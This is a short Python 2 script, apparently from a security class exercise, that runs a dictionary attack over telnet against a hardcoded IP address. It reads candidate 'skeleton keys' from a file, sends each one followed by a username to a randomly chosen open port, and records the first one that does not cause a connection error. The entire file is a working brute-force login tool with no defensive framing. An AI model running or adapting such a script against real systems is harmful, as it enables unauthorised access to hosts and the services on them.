#!/usr/bin/env python

import socket
import errno
import requests
import getpass
import sys
import telnetlib
import time
import utils
import random as rd
from requests.auth import HTTPBasicAuth


UNAME = 'ceneri' 
IP_ADDRESS = '128.114.59.215'

IN_FILE = "openPorts.txt"
OUT_FILE = "skeletonKey.txt"

SDICTIONARY_FILE = "skeletonDictionary.py"

#https://docs.python.org/2.4/lib/telnet-example.html
def main():

	HOST = IP_ADDRESS

	#Open output file
	file = open(OUT_FILE, "w")

	#Get input from file
	openPorts = utils.get_file_input_as_list(IN_FILE)
	randomIndex = rd.randint(0, len(openPorts)-1)
	RANDOM_PORT = openPorts[randomIndex]

	#Get skeleton dictionary
	sDictionary = utils.get_file_input_as_list(SDICTIONARY_FILE)


	for sKey in sDictionary:

		tnet = telnetlib.Telnet(HOST, RANDOM_PORT)
		
		try: 
			#Test current sKey
			tnet.write(sKey + "\n")
			tnet.read_until("Username: ")
			tnet.write(UNAME + "\n")

			#If no problems are encountered write down the real Skeleton Key
			file.write(sKey + "\n")
			file.close()
			break

		#invalid sKey, try another one
		except EOFError, v:

			continue


if __name__ == '__main__':
	main()